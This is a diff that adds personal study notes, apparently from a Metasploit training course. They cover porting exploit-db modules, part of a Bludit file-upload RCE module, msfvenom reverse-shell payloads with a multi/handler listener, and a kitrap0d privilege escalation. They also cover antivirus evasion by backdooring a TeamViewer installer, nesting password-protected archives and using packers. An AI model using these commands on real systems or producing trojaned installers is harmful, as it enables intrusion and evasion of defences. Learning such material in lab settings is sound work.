@@ -390,3 +390,212 @@ $cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/we
 $msfconsole -m /usr/share/metasploit-framework/modules/
 \\MSF-Loading Additional Modules
 msf>loadpath /usr/share/metasploit-framework/modules/
+alternative $> msfconsole >load_all 
+\\Porting Over Scripts into Metasploit Modules.
+-take existing exploit modules from the categories our project fits in and repurpose it for our curent port-over script.
+-alway keep custom modules organized 
+-EX: https://www.exploit-db.com/exploits/48746 we will need to download the script, 48746.rb and proceed to copy it into the /usr/share/metasploit-framework/modules/exploits/linux/http/ folder. 
+\\Porting MSF modules
+$ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
+bludit_upload_images_exec.rb
+
+
+- if we want to find the appropriate mixins, classes, and methods required for our module to work we will need to look up the diff entries on the https://docs.metasploit.com/api/
+$search sploit nagios3_command_injection
+$search sploit -t Nagios3 --exclude=".py"
+$ls .msf4/
+$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
+$msfconsole -m /usr/share/metasploit-framework/modules/
+\\MSF- Loading additional modules
+msf>loadpath /usr/share/metasploit-framework/modules
+-alternative we can aalso lauch msfconsole and run the reload all  msf> reload_all
+
+> at the beginin of the file we copied, which is where we will filling our information, we can notice the include statements at the begining ò the boiler module. these are the mixims mentioned in the plugin mixins section, -> change these to te appropriate one forour module
+
+ \\Writing Our Module
+ -incase we face a custom-built network running proprietary code to serve ít's clients during a specific assessments. most of the modules wwe have at  hand do not even make a dent in their perimeter, and we cannot seem o scan and document the target with anything we have correctly. this is where we might find it helpful to dust off our Ruby skill
+\\Porting MSF modules
+$ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
+bludit_upload_images_exec.rb
+$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
+> at the beginin of the file we copied, which is where we will filling our information, we can notice the include statements at the begining ò the boiler module. these are the mixims mentioned in the plugin mixins section, -> change these to te appropriate one forour module
+https://docs.metasploit.com/api/
+\\Writing our Module
+in case customize for a priatetary network https://docs.metasploit.com/api/
+>from scanner to other auxiliary tools, from custom-made exploits to ported ones, coding in ruby for the framework is an amazingly applicable skill
+-EX:https://www.exploit-db.com/exploits/47699 exploit 
+\\Proof-of-Concept-Requirements
+<ruby>##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+  include Msf::Exploit::FileDropper
+  include Msf::Auxiliary::Report
+-look at the include statements to see what each one does.this can be done by croo-referencing them with doc.
+
+Function	Description
+Msf::Exploit::Remote::HttpClient	This module provides methods for acting as an HTTP client when exploiting an HTTP server.
+Msf::Exploit::PhpEXE	This is a method for generating a first-stage php payload.
+Msf::Exploit::FileDropper	This method transfers files and handles file clean-up after a session with the target is established.
+Msf::Auxiliary::Report	This module provides methods for reporting data to the MSF DB.
+> we conclude dont need dropper method and we drop it from the final module code
+\\Proof-of-Concept - Module information
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
+      'Description'    => %q{
+        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
+        parameter in the image upload feature in order to save a malicious payload anywhere
+        onto the server, and then use a custom .htaccess file to bypass the file extension
+        check to finally get remote code execution.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'christasa', # Original discovery
+          'sinn3r'     # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-16113'],
+          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
+          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Notes'          =>
+        {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'Targets'        =>
+        [
+          [ 'Bludit v3.9.2', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "2019-09-07",
+      'DefaultTarget'  => 0))
+-after the general identification infor is filled in, we can move over to the options menu variable
+\\Proof-of-Concept-functionalities
+ register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
+        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
+        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
+      ])
+  end
+-look back at our exploit, we see that a wordlist will be required instead of the BLUDITPASS variable for the module to brute-force the password for the same user name. 
+    OptPath.new('PASSWORDS', [ true, 'The list of passwords',
+          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
+-the rest of exploit code need to be adjusted according to the classes, methods, and var used in the porting to the metasploit framework for the module to work in the end the final version of module look like
+https://academy.hackthebox.com/module/39/section/417
+https://nostarch.com/metasploit
+https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/
+\\\\\\\\\\\\\================================
+Introduction to msfvenom
+successor of MSFpayload and MSFEncode, 2 stand-alone script that used to work in conjuntction with msfconsole 
++msfpayload used to generate shellcode for a specific processor architecture and OS releasee,
+MSFEncode, which contain multiple encoding schemes used both for removing bad char from shellcode
+(some time cause instability duringrun time)
+ The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past. Heuristic analysis, machine learning, and deep packet inspection
+ \\Create our payload
+ ex; found an ftp server linked to web service running on port tcp/80 of the same machine, can be view in /upload dir
+ \\scanning the Target
+ $nmap -sV -T4 -p- 10.10.10.5
+ \\FTP Anonymous access
+ $ftp 10.10.10.5 > ls  <notice the aspnet_client, we relize that the box will be able to run .aspx reverse shells. luckily for us msfvenom can do just that without any issues
+ \\Generating Payload
+ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+ -now navigate to https://10/10.10.5/reverse_shell.aspx and it will trigger the .aspx payload
+ \\MSF - Setting Up Multi/handler
+$msfconsole -q > show options set LHOST 10.10.14.5 > set LPORT 1337 > run
+//Executing the Payload
+browser for http://10.10.10.5/reverse_shell.aspx
+\\MSF - Meterpreter shell
+-if the meterpreter sessions dies too often, consider encoding it to avoid error
+\\Local exploit Suggester
+we use this module EX as the meterpreter shell landed on the IIS APPOOL\Web user which natually does not have many permissions
+-further more running the sysinfo command show us that the system is of x86 bit architecture 
+\\MSF - Searching for Local Exploit Suggester
+msf>search local exploit Suggester
+msf exploit (multi/handler) > use 2376 > show options >set session 2 > see for resullt
+bypassauc_eventvwr fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option, ms10_015_kitrap0d, does the trick
+msf exploit(multi/handler)>search kittrap0d > use 0 > show options > set LPORT 1338 > set SESSION 3 >run >getuid
+\\Firewall and IDS/IPS evasion
+understant what target defend is best pratice before attack it
+\\Endpoint protection
+Endpoint protection usually comes in the form of software packs which include Antivirus Protection, Antimalware Protection (this includes bloatware, spyware, adware, scareware, ransomware), Firewall, and Anti-DDOS all in one,
+\\Perimeter Protection
+Perimeter protection usually comes in physical or virtualized devices on the network perimeter edge. These edge devices themselves provide access inside of the network from the outside, in other terms, from public to private.
+Between these two zones, on some occasions, we will also find a third one, called the De-Militarized Zone (DMZ), which was mentioned previously. This is a lower-security policy level zone than the inside networks' one, but with a higher trust level than the outside zon
+\\Security Policies
+Security policies are the drive behind every well-maintained security posture of any network. They function the same way as ACL (Access Control Lists) do for anyone familiar with the Cisco CCNA educational material. They are essentially a list of allow and deny statements that dictate how traffic or files can exist within a network boundary
+
+Network Traffic Policies
+Application Policies
+User Access Control Policies
+File Management Policies
+DDoS Protection Policies
+Others
+Security Policy	Description
+Signature-based Detection	The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.
+Heuristic / Statistical Anomaly Detection	Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.
+Stateful Protocol Analysis Detection	Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.
+Live-monitoring and Alerting (SOC-based)	A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead.
+\\Evasion Techniques
+https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/
+https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411
+https://www.google.com/search?q=Stopping+Data+Exfil+and+Malware+Spread+through+DNS&oq=Stopping+Data+Exfil+and+Malware+Spread+through+DNS&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBBzExM2owajeoAgCwAgA&sourceid=chrome&ie=UTF-8
+\\msfvenom method to bypass AV . use any executables as a platform, we can embed the shellcode into any installer, package, or program that we have a hand,hidding the payload shellcode deep within the legitimate code of the actual product.
+-this greatly obfuscates our malicious code and lower detection changes.
+-There are many valid combinations between actual, legitimate executable files, our different encoding schemes (and their iterations), and our different payload shellcode variants. This generates what is called a backdoored executable.
+$msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/Teamviewer_Setup.exe -i 5
+-K flag run the payload repeatly , the target will only notice the running backdoor if they launch the backdoored exe template from a CLI enviroment. if they do so, a separate window will popup with the payload, which will not close until we finish running the payload session interaction on the target
+\\Archives
+Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today
+\\Generating Payload
+$msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x8/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+$cat test.js
+checking virustotal > msf-virustotal -k <api key> -f test.js
+\\Archiving the payload
+$wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+$tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+$rar a ~/test.rar -p ~/test.js
+\\Removing the .RAR extension
+mv test.rar test  > ls
+\\Archving the Payload again 
+$rar a test2.rar -p test
+\\Remove the .Rar extension
+$mv test2.rar test2  >  ls
+>$msf-virustotal -k <apikey> -f test2
+\\Packers
+The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program and with the decompression code in one single file
+-When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts
+This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality
+- In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.
+//UPX packer	The Enigma Protector	MPRESS
+Alternate EXE Packer	ExeStealth	Morphine
+MEW	Themida
+https://jon.oberheide.org/files/woot09-polypack.pdf
+\\exploit coding (offset for evasion)
+When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.
+For example, a typical Buffer Overflow exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.
+When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an Offset switch inside the code for the msfconsole module:
+
+'Targets' =>
+[
+ 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
+],
+
+might only have one chance to do this correctly during an assessment.
+https://nostarch.com/metasploit
+
+des the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. Please note that the BoF code's purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these
+Intrusion Prevention Systems and Antivirus Engines are the most common defender tools that can shoot down an initial foothold on the target. These mainly function on signatures of the whole malicious file or the stub stage.
